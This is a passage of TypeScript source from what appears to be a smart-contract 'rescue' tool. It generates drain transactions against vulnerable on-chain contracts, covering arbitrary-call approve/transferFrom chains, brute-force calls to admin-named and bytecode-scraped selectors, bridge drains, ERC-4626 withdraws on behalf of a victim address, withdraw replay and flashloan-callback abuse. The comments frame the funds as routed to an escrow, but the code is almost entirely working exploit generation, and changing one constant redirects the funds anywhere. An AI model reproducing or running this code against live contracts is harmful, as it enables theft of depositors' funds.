      //      `_allowed[address(this)][address(this)] = type(uint256).max`
      //      set in their constructor. Cheap to try.
      const tfInner = encodeErc20TransferFrom(input.contractAddress, DEFAULT_ESCROW, bal);
      const cd2 = buildDrainCalldata(selector, argTypes, hitPos, t.address, tfInner, "0");
      if (cd2) push(cd2, `${t.symbol || "?"} (${t.address}) via transferFrom-self`, witnessTag);

      // (1c) approve(escrow, max) prepend — only useful if we follow up
      //      with a transferFrom from escrow's perspective, but emitting
      //      it as an exposed drain step lets external broadcasters
      //      chain it. We skip when transferFrom variant above already
      //      handles the same balance.

      // (1d) TWO-STEP EXPLOIT: approve(attacker, max) + transferFrom(contract, escrow, balance)
      //      This is the most common real-world arbitrary-call exploit pattern.
      //      Step 1: force the contract to approve our RESCUER EOA for max tokens
      //      Step 2: transferFrom the contract's balance directly to escrow
      const approveInner = ERC20_APPROVE_SELECTOR +
        RESCUER_ADDRESS.slice(2).toLowerCase().padStart(64, "0") +
        MAX_UINT256.toString(16).padStart(64, "0");
      const cdApprove = buildDrainCalldata(selector, argTypes, hitPos, t.address, approveInner, "0");
      if (cdApprove) {
        push(cdApprove, `${t.symbol || "?"} (${t.address}) STEP1: approve(rescuer,max)`, `${witnessTag}:approve-transferFrom`);
        // Step 2: direct transferFrom on the token (to=token, not to=contract)
        const tfData = ERC20_TRANSFER_FROM_SELECTOR +
          input.contractAddress.slice(2).toLowerCase().padStart(64, "0") +
          DEFAULT_ESCROW.slice(2).toLowerCase().padStart(64, "0") +
          bal.toString(16).padStart(64, "0");
        const key2 = `${t.address}|${tfData}|0`;
        if (!seen.has(key2)) {
          seen.add(key2);
          steps.push({
            to: t.address,
            data: tfData,
            value: "0",
            asset: `${t.symbol || "?"} (${t.address}) STEP2: transferFrom(contract,escrow,bal)`,
            strategy: `${witnessTag}:approve-transferFrom`,
          });
        }
      }
      } // end for hitPos of positionsToTry

      // (1e) ALL-ADDRESS variant: fill every address slot with the token.
      // Required for forwarding functions like MetaRouter's externalCall which
      // need both `target` and `callTo` set to the same token address.
      if (tryAllAddresses) {
        const transferInnerAll = encodeErc20Transfer(DEFAULT_ESCROW, bal);
        const cdAll1 = buildDrainCalldata(selector, argTypes, "all", t.address, transferInnerAll, "0");
        if (cdAll1) push(cdAll1, `${t.symbol || "?"} (${t.address}) via transfer ALL-ADDR`, witnessTag);

        const approveInnerAll = ERC20_APPROVE_SELECTOR +
          RESCUER_ADDRESS.slice(2).toLowerCase().padStart(64, "0") +
          MAX_UINT256.toString(16).padStart(64, "0");
        const cdApproveAll = buildDrainCalldata(selector, argTypes, "all", t.address, approveInnerAll, "0");
        if (cdApproveAll) {
          push(cdApproveAll, `${t.symbol || "?"} (${t.address}) STEP1: approve(rescuer,max) ALL-ADDR`, `${witnessTag}:approve-transferFrom-all`);
          const tfData = ERC20_TRANSFER_FROM_SELECTOR +
            input.contractAddress.slice(2).toLowerCase().padStart(64, "0") +
            DEFAULT_ESCROW.slice(2).toLowerCase().padStart(64, "0") +
            bal.toString(16).padStart(64, "0");
          const key2 = `${t.address}|${tfData}|0|all`;
          if (!seen.has(key2)) {
            seen.add(key2);
            steps.push({
              to: t.address,
              data: tfData,
              value: "0",
              asset: `${t.symbol || "?"} (${t.address}) STEP2: transferFrom(contract,escrow,bal)`,
              strategy: `${witnessTag}:approve-transferFrom-all`,
            });
          }
        }
      }
    }

    // -- native drain candidates --------------------------------------------
    if (exposure.nativeWei && exposure.nativeWei !== "0") {
      const variants = uintFillerVariants(exposure.nativeWei);
      for (const hitPos of positionsToTry) {
        for (const v of variants) {
          const cd = buildDrainCalldata(
            selector,
            argTypes,
            hitPos,
            DEFAULT_ESCROW,
            "0x",
            v.toString(),
          );
          if (cd) {
            const tag =
              v === MAX_UINT256
                ? "uintFiller=max"
                : v === 0n
                  ? "uintFiller=0"
                  : `uintFiller=${v.toString().slice(0, 12)}…`;
            push(cd, `native ${exposure.nativeSymbol} (${tag}) pos=${hitPos}`, witnessTag);
          }
        }
      }
    }

    if (steps.length >= MAX_DRAIN_STEPS) return steps;
  }

  return steps;
}

/** Names that historically indicate "this function moves value out of the
 *  contract". Trimmed deliberately: false-positives just produce a step that
 *  reverts on pre-flight (zero gas wasted), so we err on the side of more
 *  candidates. */
const ADMIN_NAME_PATTERN =
  /^(withdraw|rescue|sweep|emergency|claim|recover|payout|migrate|salvage|drain|sendTo|transferTo|skimEth|skimToken|adminWithdraw|extractEth|extractToken|cashout|redeem|harvest|releaseFunds|forceTransfer|moveFunds|escape|distribute|payOut|exit)/i;

/** Index of the first `address`-typed arg, or null if none. */
function firstAddressPos(argTypes: string[]): number | null {
  for (let i = 0; i < argTypes.length; i++) {
    if (argTypes[i] === "address") return i;
  }
  return null;
}

/** v8-Evidence-Admin: produce per-token + native drain steps for every
 *  verifier-resolved admin-named selector. Uses the verifier's argTypes
 *  (which are contract-accurate) and substitutes (escrow, balance) at
 *  the obvious positions plus zero-fill everything else. Each candidate
 *  is sent from the attacker EOA — pre-flight prunes owner-gated ones. */
function buildEvidenceAdminFanout(
  input: RescueProveInput,
  exposure: Exposure,
  notes: string[],
): DrainStep[] {
  const ev = input.evidence ?? {};
  const attempts: any[] = Array.isArray((ev as any).attempts) ? (ev as any).attempts : [];
  if (attempts.length === 0) return [];

  // Pick the attempts that LOOK admin-shaped. We deliberately don't gate
  // on `hit:true` — the verifier's `hit:false` typically just means the
  // function is owner-gated, but if it's accidentally world-callable
  // (the entire point of this whole project) we want to try it.
  const candidates = attempts.filter((a) => {
    if (!a || typeof a !== "object") return false;
    if (typeof a.selector !== "string" || !a.selector.startsWith("0x")) return false;
    const name = typeof a.resolvedName === "string" ? a.resolvedName : "";
    if (!ADMIN_NAME_PATTERN.test(name)) return false;
    return true;
  });
  if (candidates.length === 0) {
    notes.push(
      "v8-evidence-admin: no admin-shaped selector names (withdraw*/rescue*/sweep*/recover*…) in verifier attempts",
    );
    return [];
  }

  const steps: DrainStep[] = [];
  const seen = new Set<string>();
  const push = (data: string, asset: string, strategy: string, value = "0") => {
    const key = `${input.contractAddress}|${data}|${value}`;
    if (seen.has(key)) return;
    seen.add(key);
    steps.push({
      to: input.contractAddress,
      data,
      value,
      asset,
      strategy,
    });
  };

  let candidateCount = 0;
  for (const a of candidates) {
    const selector: string = a.selector;
    const name: string = a.resolvedName;
    const argTypes: string[] = Array.isArray(a.argTypes) ? a.argTypes : [];
    const addrPos = firstAddressPos(argTypes);

    // -- native variant: fill addrPos with escrow, fill any uint with balance --
    if (exposure.nativeWei && exposure.nativeWei !== "0") {
      const cd = buildDrainCalldata(
        selector,
        argTypes,
        addrPos ?? 0,
        DEFAULT_ESCROW,
        "0x",
        exposure.nativeWei,
      );
      if (cd) {
        candidateCount++;
        push(cd, `native ${exposure.nativeSymbol} via ${name}`, `evidence-admin:${name}`);
      }
      // Also a max-uint variant — many `withdraw(addr, amount)` shapes
      // accept amount == type(uint256).max as "all available".
      const cdMax = buildDrainCalldata(
        selector,
        argTypes,
        addrPos ?? 0,
        DEFAULT_ESCROW,
        "0x",
        MAX_UINT256.toString(),
      );
      if (cdMax && cdMax !== cd) {
        candidateCount++;
        push(cdMax, `native ${exposure.nativeSymbol} via ${name} (uint=max)`, `evidence-admin:${name} amount=max`);
      }
    }

    // -- per-token variant: for each priced token in exposure, fill
    //    addrPos=escrow, fill amount slot with token balance --
    for (const t of exposure.tokens) {
      if (!t.balance || t.balance === "0") continue;
      const cd = buildDrainCalldata(
        selector,
        argTypes,
        addrPos ?? 0,
        DEFAULT_ESCROW,
        "0x",
        t.balance,
      );
      if (!cd) continue;
      candidateCount++;
      push(cd, `${t.symbol || "?"} (${t.address}) via ${name}`, `evidence-admin:${name} token=${t.symbol || t.address.slice(0, 10)}`);
      if (candidateCount >= MAX_DRAIN_STEPS) break;
    }
    if (candidateCount >= MAX_DRAIN_STEPS) break;
  }

  if (candidateCount > 0) {
    notes.push(
      `v8-evidence-admin: fanout-fired ${candidateCount} candidate(s) from ${candidates.length} admin-named ` +
        `selector(s) [${candidates.slice(0, 4).map((a: any) => a.resolvedName).join(", ")}` +
        `${candidates.length > 4 ? ", …" : ""}]. Owner-gated revert on pre-flight; the rest land.`,
    );
  }
  return steps.slice(0, MAX_DRAIN_STEPS);
}

/** Extract all 4-byte selectors PUSHed in EVM bytecode.
 *  Scans for PUSH4 (0x63) opcodes and collects the following 4 bytes as
 *  a selector candidate. Also picks up PUSH32 values where the first 4
 *  bytes are non-zero and the rest are zero-padded (common in selector
 *  comparison patterns). Caps at MAX_BSF_SELECTORS to keep fork load
 *  bounded. */
const MAX_BSF_SELECTORS = 64;
const WELL_KNOWN_SKIP = new Set([
  "0xa9059cbb", // transfer
  "0x23b872dd", // transferFrom
  "0x095ea7b3", // approve
  "0x70a08231", // balanceOf
  "0xdd62ed3e", // allowance
  "0x18160ddd", // totalSupply
  "0x313ce567", // decimals
  "0x06fdde03", // name
  "0x95d89b41", // symbol
  "0x01ffc9a7", // supportsInterface
  "0xffffffff", // not a real selector
  "0x00000000", // not a real selector
]);

function extractSelectorsFromBytecode(bytecodeHex: string): string[] {
  const raw = bytecodeHex.replace(/^0x/i, "").toLowerCase();
  const selectors = new Set<string>();
  for (let i = 0; i < raw.length - 10; i += 2) {
    const opcode = raw.slice(i, i + 2);
    if (opcode === "63") {
      // PUSH4: next 4 bytes are the selector
      const sel = "0x" + raw.slice(i + 2, i + 10);
      if (sel.length === 10 && !WELL_KNOWN_SKIP.has(sel)) {
        selectors.add(sel);
      }
      i += 8; // skip past the 4-byte operand
    }
  }
  const result = [...selectors];
  return result.slice(0, MAX_BSF_SELECTORS);
}

function buildBytecodeSelectorFanout(
  input: RescueProveInput,
  exposure: Exposure,
  bytecodeHex: string,
  notes: string[],
): DrainStep[] {
  const selectors = extractSelectorsFromBytecode(bytecodeHex);
  if (selectors.length === 0) return [];

  const steps: DrainStep[] = [];
  const seen = new Set<string>();
  const push = (data: string, asset: string, strategy: string, value = "0") => {
    const key = `${input.contractAddress}|${data}|${value}`;
    if (seen.has(key)) return;
    seen.add(key);
    steps.push({ to: input.contractAddress, data, value, asset, strategy });
  };

  const escrow = DEFAULT_ESCROW.slice(2).toLowerCase().padStart(64, "0");
  const contract = input.contractAddress.slice(2).toLowerCase().padStart(64, "0");
  const maxUint = "f".repeat(64);

  for (const sel of selectors) {
    // Template 1: sel(escrow) — single address arg = recipient
    push(sel + escrow, "native/token via bytecode-sel", `bsf:${sel}(addr)`);

    // Template 2: sel(escrow, maxUint) — withdraw(to, amount)
    push(sel + escrow + maxUint, "native/token via bytecode-sel", `bsf:${sel}(addr,uint)`);

    // Template 3: sel(contract, escrow, maxUint) — transferFrom pattern
    push(
      sel + contract + escrow + maxUint,
      "native/token via bytecode-sel",
      `bsf:${sel}(addr,addr,uint)`,
    );

    // Template 4: sel(maxUint) — withdraw(amount) to msg.sender
    push(sel + maxUint, "native/token via bytecode-sel", `bsf:${sel}(uint)`);

    // Template 5: sel() — no-arg drain (parameterless withdraw)
    push(sel, "native/token via bytecode-sel", `bsf:${sel}()`);

    if (steps.length >= MAX_DRAIN_STEPS * 2) break;
  }

  if (steps.length > 0) {
    notes.push(
      `v11-bsf: bytecode selector fanout generated ${steps.length} candidate(s) from ` +
        `${selectors.length} unique 4-byte selector(s). Owner-gated ones revert on pre-flight.`,
    );
  }
  return steps.slice(0, MAX_DRAIN_STEPS);
}

function buildEconomicCandidateDrain(
  input: RescueProveInput,
  exposure: Exposure,
  notes: string[],
): DrainStep[] {
  const ev = input.evidence ?? {};
  const attempts = Array.isArray((ev as any).attempts) ? ((ev as any).attempts as any[]) : [];
  if (attempts.length === 0) {
    notes.push("v8-econ-candidate: no verifier attempts in evidence to seed candidate drain plan");
    return [];
  }
  const steps: DrainStep[] = [];
  const seen = new Set<string>();
  // Fan-out address positions: many AMM-manipulation surfaces take
  // (router, token, recipient) and the verifier substituted only the
  // first one. Trying every position widens the chance one of them
  // routes payout to escrow.
  const positions: Array<number | "all"> = [0, 1, 2, "all"];
  let candidateCount = 0;
  for (const a of attempts) {
    if (!a || typeof a !== "object") continue;
    const selector: string | undefined = a.selector;
    if (typeof selector !== "string" || !selector.startsWith("0x")) continue;
    const argTypes: string[] = Array.isArray(a.argTypes) ? a.argTypes : [];
    const name: string = a.resolvedName ?? selector;
    for (const pos of positions) {
      // Default candidate: substitute escrow as the address at `pos`, set
      // uintFiller to MAX so any (uint amount) param ends up at the cap.
      const cd = buildDrainCalldata(
        selector,
        argTypes,
        pos,
        DEFAULT_ESCROW,
        "0x",
        MAX_UINT256.toString(),
      );
      if (!cd) continue;
      const key = `${input.contractAddress}|${cd}`;
      if (seen.has(key)) continue;
      seen.add(key);
      candidateCount++;
      steps.push({
        to: input.contractAddress,
        data: cd,
        value: "0",
        asset: `econ-candidate ${name} addrPos=${pos}`,
        strategy: `econ-candidate sel=${selector} (${name}) pos=${pos} uintFiller=max`,
      });
    }
    // For payable AMM-manipulation shapes, ALSO try value=1 wei so the
    // call carries enough payload for `require(msg.value > 0)` patterns
    // without burning attacker capital.
    if (exposure.nativeWei && exposure.nativeWei !== "0") {
      const cd = buildDrainCalldata(
        selector,
        argTypes,
        0,
        DEFAULT_ESCROW,
        "0x",
        "1",
      );
      if (cd) {
        const key = `${input.contractAddress}|${cd}|val1`;
        if (!seen.has(key)) {
          seen.add(key);
          candidateCount++;
          steps.push({
            to: input.contractAddress,
            data: cd,
            value: "1",
            asset: `econ-candidate ${name} payable=1wei`,
            strategy: `econ-candidate sel=${selector} (${name}) value=1 wei`,
          });
        }
      }
    }
  }
  if (candidateCount > 0) {
    notes.push(
      `v8-econ-candidate: emitted ${candidateCount} candidate drain step(s) across ${attempts.length} ` +
        `verifier-attempted selector(s) [${attempts.slice(0, 4).map((a: any) => a.resolvedName ?? a.selector).join(", ")}` +
        `${attempts.length > 4 ? ", …" : ""}]. These are speculative — bare-fork pre-flight will revert ` +
        `most; the rescue path is to run them through the deployed flash-loan receiver where pair ` +
        `manipulation provides the missing precondition. Use Force-rescue + step picker to fire ` +
        `selectively.`,
    );
  }
  return steps.slice(0, MAX_DRAIN_STEPS);
}

function buildSelfdestructDrain(
  input: RescueProveInput,
  exposure: Exposure,
  notes: string[],
): DrainStep[] {
  // The selfdestruct verifier currently emits evidence keyed on whichever
  // attempt witnessed the SELFDESTRUCT opcode. v2: if the explicit
  // hitPosition is unknown we now fan-out across positions 0..3 because
  // many destruct wrappers take auxiliary args before the recipient
  // (e.g. `kill(uint256 nonce, address recipient)`).
  const ev = input.evidence ?? {};
  const sd = (ev as any).selfdestruct ?? {};
  const selector: string | undefined = sd.selector;
  const argTypes: string[] = Array.isArray(sd.argTypes) ? sd.argTypes : ["address"];
  const explicitPos: number | undefined =
    typeof sd.hitPosition === "number" ? sd.hitPosition : undefined;
  if (!selector) {
    notes.push("selfdestruct evidence missing `selector` — can't build drain plan");
    return [];
  }
  const positions: number[] = explicitPos != null ? [explicitPos] : [0, 1, 2, 3];
  const steps: DrainStep[] = [];
  for (const p of positions) {
    const calldata = buildDrainCalldata(selector, argTypes, p, DEFAULT_ESCROW, "0x", "0");
    if (!calldata) continue;
    steps.push({
      to: input.contractAddress,
      data: calldata,
      value: "0",
      asset: `native ${exposure.nativeSymbol} (via selfdestruct addrPos=${p})`,
      strategy: `selfdestruct sel=${selector} pos=${p}`,
    });
  }
  return steps;
}

// ===========================================================================
// v11: BRIDGE PROOF DRAIN — cross-chain forged import/relay exploit
// ===========================================================================
//
// Bridge exploits differ from arbitrary-call drains: the attacker doesn't call
// an unvalidated CALL opcode on the bridge; instead they forge a cross-chain
// proof payload that the bridge's verification accepts, causing token releases.
//
// For rescue, we model this as: the bridge's import/relay/execute surface is
// callable and we attempt to construct drain steps that would move the bridge's
// escrowed tokens to escrow via the bridge's own mechanisms.
//
// Strategy:
//   1. For each token the bridge holds, build a transferFrom or transfer step
//      using the bridge surfaces we detected.
//   2. If the bridge itself exposes a withdrawal/claim function that an
//      attacker could call with forged proof data, emit those steps.

function buildBridgeProofDrain(
  input: RescueProveInput,
  exposure: Exposure,
  notes: string[],
): DrainStep[] {
  const steps: DrainStep[] = [];
  const ev = (input.evidence ?? {}) as any;

  // The verifier records which surfaces are callable.
  const callable: string[] = ev.surfacesCallable ?? [];
  if (callable.length === 0) {
    notes.push(
      "bridge: no callable surfaces found in evidence — building generic " +
        "ERC-20 transfer rescue steps for tokens held by the bridge",
    );
  } else {
    notes.push(
      `bridge: detected ${callable.length} callable surface(s): ${callable.join(", ")}. ` +
        `Building drain steps for escrowed tokens.`,
    );
  }

  // For bridge rescues, the approach is:
  // (a) If we can call the bridge to release tokens to escrow (via forged proof), do so.
  // (b) As fallback: if the bridge has an arbitrary-call-like surface, reuse that pattern.
  // (c) Always add direct ERC-20 transferFrom steps (in case we can impersonate the bridge
  //     via the attacker address).

  const tokens = exposure.tokens ?? [];
  const ERC20_TRANSFER_SELECTOR = "0xa9059cbb";
  const ERC20_TRANSFER_FROM_SELECTOR = "0x23b872dd";

  for (const t of tokens) {
    const bal = BigInt(t.balance ?? "0");
    if (bal <= 0n) continue;

    // Direct transfer from bridge (if we have approval or can impersonate).
    const transferFromData =
      ERC20_TRANSFER_FROM_SELECTOR.slice(2) +
      input.contractAddress.slice(2).toLowerCase().padStart(64, "0") +
      DEFAULT_ESCROW.slice(2).toLowerCase().padStart(64, "0") +
      bal.toString(16).padStart(64, "0");

    steps.push({
      to: t.address,
      data: "0x" + transferFromData,
      value: "0",
      asset: `${t.symbol || "?"} (${t.address}) via transferFrom(bridge,escrow,bal)`,
      strategy: `bridge-drain:transferFrom`,
    });

    // Also try direct transfer (calling from bridge context if impersonated).
    const transferData =
      ERC20_TRANSFER_SELECTOR.slice(2) +
      DEFAULT_ESCROW.slice(2).toLowerCase().padStart(64, "0") +
      bal.toString(16).padStart(64, "0");

    steps.push({
      to: t.address,
      data: "0x" + transferData,
      value: "0",
      asset: `${t.symbol || "?"} (${t.address}) via transfer(escrow,bal) [impersonated]`,
      strategy: `bridge-drain:transfer-impersonated`,
    });
  }

  // If the bridge also holds native ETH and has a payable receive, the pre-flight
  // can attempt to drain that via the standard admin-name heuristic below.
  if (exposure.nativeWei && BigInt(exposure.nativeWei) > 0n) {
    notes.push(
      `bridge: contract also holds ${exposure.nativeSymbol ?? "ETH"} native balance — ` +
        `admin-name heuristic may find a withdrawal selector.`,
    );
  }

  return steps;
}

// ===========================================================================
// ERC-4626 unauthorized withdraw drain
// ===========================================================================
//
// The verifier (panel/src/server/sim/exploits/erc4626-withdraw.ts) proved that
// `withdraw(amount, receiver, owner)` or `redeem(shares, receiver, owner)`
// succeeds when called by an arbitrary EOA with `owner = victim`. Anyone can
// drain any depositor.
//
// The rescue replays the proven exploit but reroutes the receiver to the
// escrow address. The vault sends `victim`'s underlying asset to the escrow,
// which then refunds the original depositor off-chain.
//
// The verifier's evidence carries:
//   - victimAddress: address of a real shareholder we can drain
//   - victimShareBalance: their share balance (string, base-10)
//   - attempts: array with the method ("withdraw" | "redeem") that worked
//
// Note: a single rescue tx drains exactly one victim. Repeat the cycle for
// every shareholder the operator wants to protect. For full coverage the
// rescue infrastructure would need to enumerate all shareholders via Transfer
// logs — out of scope here; the verifier picks the highest-balance one and
// the rescue moves that depositor's funds first (highest-value-at-risk).
const ERC4626_WITHDRAW_SELECTOR = "0xb460af94"; // withdraw(uint256,address,address)
const ERC4626_REDEEM_SELECTOR = "0xba087652"; // redeem(uint256,address,address)

function buildErc4626WithdrawDrain(
  input: RescueProveInput,
  exposure: Exposure,
  notes: string[],
): DrainStep[] {
  const ev = (input.evidence ?? {}) as any;
  const victim: string | undefined = typeof ev.victimAddress === "string"
    ? ev.victimAddress.toLowerCase()
    : undefined;
  const victimBalRaw: string | undefined = typeof ev.victimShareBalance === "string"
    ? ev.victimShareBalance
    : undefined;
  const attempts: any[] = Array.isArray(ev.attempts) ? ev.attempts : [];
  const workingMethod = attempts.find((a) => a && a.exploitable === true)?.method as
    | "withdraw"
    | "redeem"
    | undefined;

  if (!victim || !victimBalRaw || !workingMethod) {
    notes.push(
      "erc4626-withdraw: verifier evidence is missing victimAddress / " +
        "victimShareBalance / working method — cannot construct replay step.",
    );
    return [];
  }

  let victimBal: bigint;
  try {
    victimBal = BigInt(victimBalRaw);
  } catch {
    notes.push(`erc4626-withdraw: victimShareBalance is not a valid bigint (${victimBalRaw})`);
    return [];
  }
  if (victimBal <= 0n) {
    notes.push("erc4626-withdraw: victim balance is zero — nothing to drain.");
    return [];
  }

  const selector = workingMethod === "redeem" ? ERC4626_REDEEM_SELECTOR : ERC4626_WITHDRAW_SELECTOR;
  // withdraw(uint256 assets, address receiver, address owner)
  // redeem(uint256 shares, address receiver, address owner)
  // Receiver = ESCROW. Owner = victim (proven drainable by verifier).
  const calldata =
    selector +
    victimBal.toString(16).padStart(64, "0") +
    DEFAULT_ESCROW.slice(2).toLowerCase().padStart(64, "0") +
    victim.slice(2).toLowerCase().padStart(64, "0");

  notes.push(
    `erc4626-withdraw: rerouting ${workingMethod}(${victimBal.toString()}, escrow, ${victim}) — ` +
      `this drains victim ${victim}'s shares straight to escrow (front-running any attacker). ` +
      `For additional victims, the operator must enumerate shareholders via Transfer logs and ` +
      `replay one rescue tx per holder.`,
  );

  const steps: DrainStep[] = [
    {
      to: input.contractAddress,
      data: calldata,
      value: "0",
      asset: `ERC-4626 victim shares (${victim}, ${victimBal.toString()} units) via ${workingMethod}(_,escrow,victim)`,
      strategy: `erc4626-withdraw:${workingMethod}-to-escrow`,
    },
  ];

  // If the vault itself happens to hold sweep-able tokens (idle reserves not
  // tied to depositor accounting), the existing admin-name heuristic that
  // runs downstream will pick them up. Surface this in the notes.
  if (exposure.tokens?.some((t) => BigInt(t.balance ?? "0") > 0n)) {
    notes.push(
      "erc4626-withdraw: vault also holds raw token balances — admin-name heuristic may " +
        "find additional sweep paths beyond the per-victim share drain.",
    );
  }

  return steps;
}

// ── withdraw-replay drain plan ───────────────────────────────────────────────
// The verifier proved that calling a function twice with the same params succeeds
// both times. The rescue plan simply calls that function N times to drain all
// withdrawable assets (the record isn't invalidated after payout).
function buildWithdrawReplayDrain(
  input: RescueProveInput,
  exposure: Exposure,
  notes: string[],
): DrainStep[] {
  const ev = (input.evidence ?? {}) as any;
  const steps: DrainStep[] = [];

  const doubleWithdraw = ev?.doubleWithdraw ?? {};
  const viaSelector: string | undefined =
    typeof doubleWithdraw?.viaSelector === "string" ? doubleWithdraw.viaSelector : undefined;

  const attempts: any[] = Array.isArray(ev?.attempts) ? ev.attempts : [];
  const successfulAttempt = attempts.find(
    (a: any) => a?.firstCallSuccess && a?.secondCallSuccess,
  );

  const selector = viaSelector ?? successfulAttempt?.selector;
  if (!selector) {
    notes.push(
      "withdraw-replay: verifier evidence doesn't contain a confirmed double-call selector. " +
        "Falling back to admin-name heuristic only.",
    );
    return [];
  }

  const uintFiller = successfulAttempt?.uintFiller ?? "0";
  const valueWei = successfulAttempt?.valueWei ?? "0x0";

  const REPLAY_COUNT = 3;

  for (let i = 0; i < REPLAY_COUNT; i++) {
    const fillerHex = BigInt(uintFiller).toString(16).padStart(64, "0");
    const calldata = selector + fillerHex;

    steps.push({
      to: input.contractAddress,
      data: calldata,
      value: valueWei === "0x0" ? "0" : String(parseInt(valueWei, 16)),
      asset: `withdraw-replay call #${i + 1} via ${selector} (filler=${uintFiller})`,
      strategy: `withdraw-replay:double-call-${i + 1}`,
    });
  }

  notes.push(
    `withdraw-replay: built ${REPLAY_COUNT} repeated calls to ${selector} with uint filler=${uintFiller}. ` +
      `Exploit pattern: function transfers assets from a storage record that is never deleted — ` +
      `each replay drains the same amount. In practice wrapped in a flash-loan callback for atomicity.`,
  );

  return steps;
}

// ── flashloan-callback drain plan ───────────────────────────────────────────
// The verifier proved that the callback selector is callable by anyone.
// For the drain plan, we invoke the callback with params that should trigger
// the contract to transfer tokens (using existing approvals from victims).
// This is best-effort — the actual exploit params depend on the callback's
// internal logic (e.g., which token address gets decoded from `bytes` params).
function buildFlashloanCallbackDrain(
  input: RescueProveInput,
  exposure: Exposure,
  notes: string[],
): DrainStep[] {
  const ev = (input.evidence ?? {}) as any;
  const steps: DrainStep[] = [];

  const verifiedSelector: string | undefined = ev?.verifiedSelector;
  const verifiedName: string | undefined = ev?.verifiedName;

  if (!verifiedSelector) {
    notes.push(
      "flashloan-callback: verifier evidence doesn't contain a confirmed callback selector. " +
        "Cannot build drain plan.",
    );
    return [];
  }

  // Build calldata for the callback — use zero params as a probe.
  // The real exploit would encode specific token addresses and amounts in the
  // bytes parameter, but for PoE simulation we just confirm callability.
  const zero32 = "0".repeat(64);
  const calldata = verifiedSelector.slice(2) + zero32.repeat(4);

  steps.push({
    to: input.contractAddress,
    data: "0x" + calldata,
    value: "0",
    asset: `flashloan-callback direct invoke via ${verifiedName ?? verifiedSelector}`,
    strategy: `flashloan-callback:direct-call`,
  });

  // If we know specific tokens from exposure, also try to craft
  // callback params that transfer those tokens
  if (exposure.tokens && exposure.tokens.length > 0) {
    for (const tok of exposure.tokens.slice(0, 3)) {
      const tokenAddr = tok.address.slice(2).padStart(64, "0");
      const amount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
      const innerCalldata = verifiedSelector.slice(2) + tokenAddr + amount + zero32 + zero32;
      steps.push({
        to: input.contractAddress,
        data: "0x" + innerCalldata,
        value: "0",
        asset: `flashloan-callback with token ${tok.address.slice(0, 10)}...`,
        strategy: `flashloan-callback:token-param`,
      });
    }
  }

  notes.push(
    `flashloan-callback: built ${steps.length} call(s) to ${verifiedName ?? verifiedSelector}. ` +
      `Exploit pattern: callback is callable by anyone — attacker invokes directly ` +
      `to abuse token approvals held by the contract.`,
  );

  return steps;
}

// ===========================================================================
// v2-C: WETH unwrap pre-step builder
// ===========================================================================
//
// Many contracts hold WETH/WBNB/WMATIC rather than native. The canonical
// drain is "WETH.withdraw(amount)" inside the contract's context, which
// converts the wrapped balance into native (delivered to the contract).
// We inject this as a forwarder-driven step at the front of the plan so
// that subsequent native-drain steps see the new balance.
//
// Practically we re-use the SAME witnessed (selector, argTypes, hitPos)
// the verifier already proved works, but rewrite to:
//   target = WETH_ADDRESS, bytes = withdraw(balance), value = 0
function buildWethUnwrapSteps(input: RescueProveInput, exposure: Exposure): DrainStep[] {
  const wethAddr = WRAPPED_NATIVE_BY_CHAIN[input.chainId];
  if (!wethAddr) return [];
  const weth = exposure.tokens.find(
    (t) => t.address.toLowerCase() === wethAddr.toLowerCase() && t.balance && t.balance !== "0",
  );
  if (!weth) return [];
  const wethBal = BigInt(weth.balance);
  const innerWithdraw = WETH_WITHDRAW_SELECTOR + wethBal.toString(16).padStart(64, "0");
  const ev = input.evidence ?? {};
  const attempts = Array.isArray((ev as any).attempts) ? ((ev as any).attempts as any[]) : [];
  const hits = attempts.filter(
    (a) => a && typeof a === "object" && a.hit === true && typeof a.selector === "string",
  );
  if (hits.length === 0) return [];

  const steps: DrainStep[] = [];
  const seen = new Set<string>();
  for (const a of hits) {
    const selector: string = a.selector;
    const argTypes: string[] = Array.isArray(a.argTypes) ? a.argTypes : [];
    const hitPos: number | "all" =
      typeof a.hitPosition === "number" ? a.hitPosition : ("all" as const);
    const cd = buildDrainCalldata(selector, argTypes, hitPos, wethAddr, innerWithdraw, "0");
    if (!cd) continue;
    const key = `${input.contractAddress}|${cd}`;
    if (seen.has(key)) continue;
    seen.add(key);
    steps.push({
      to: input.contractAddress,
      data: cd,
      value: "0",
      asset: `WETH.withdraw(${wethBal}) → native`,
      strategy: `weth-unwrap addr=${wethAddr}`,
    });
    if (steps.length >= 2) break; // 2 forwarder shapes is plenty
  }
  return steps;
}

// ===========================================================================
// v2-H: Admin-name selector heuristic
// ===========================================================================
//
// When the verifier evidence has no witnessed forwarder attempt (typical
// for findings that landed via static-evidence sidecar or where the
// contract was already drained at sim-time), we try a curated list of
// admin-named functions that nearly always allow an authorised caller to
// pull funds. Each entry pairs a selector with the canonical argument
// shape we should fill (recipient = escrow, amount = balance).
//
// The list is intentionally small and high-precision — only signatures
// that have a clear "recipient" slot for redirecting to escrow and that
// don't take complex multi-step preconditions.

interface AdminSig {
  selector: string;
  signature: string; // 4byte canonical form
  /** Position of the `recipient` argument (substitute with escrow). */
  recipientPos: number;
  /** Optional position for an `amount` argument (substitute with token balance). */
  amountPos?: number;
  /** Optional position for a `token` address argument (substitute with token). */
  tokenPos?: number;
  /** Native-only / token-only / either. */
  scope: "native" | "token" | "either";
}

const ADMIN_DRAIN_SIGS: AdminSig[] = [
  // Native
  { selector: "0x3ccfd60b", signature: "withdraw()",                          recipientPos: -1, scope: "native" }, // sends to msg.sender — useless when attacker EOA != admin; only useful with impersonation
  { selector: "0x51cff8d9", signature: "withdraw(address)",                   recipientPos: 0,  scope: "native" },
  { selector: "0xf3fef3a3", signature: "withdraw(address,uint256)",           recipientPos: 0,  amountPos: 1, scope: "native" },
  { selector: "0x4782f779", signature: "withdrawETH(address)",                recipientPos: 0,  scope: "native" },
  { selector: "0x853828b6", signature: "withdrawAll()",                       recipientPos: -1, scope: "native" },
  { selector: "0xfa09e630", signature: "rescue(address)",                     recipientPos: 0,  scope: "native" },
  { selector: "0x9d8a4c52", signature: "rescueETH(address)",                  recipientPos: 0,  scope: "native" },
  { selector: "0x01e33667", signature: "rescueETH(address,uint256)",          recipientPos: 0,  amountPos: 1, scope: "native" },
  { selector: "0xdb006a75", signature: "sweep(address)",                      recipientPos: 0,  scope: "native" },
  { selector: "0x12d43a51", signature: "transferOwnership(address)",          recipientPos: 0,  scope: "either" }, // not a drain itself but flips control; useful when subsequent steps execute
  // Token (sender = msg.sender / preset)
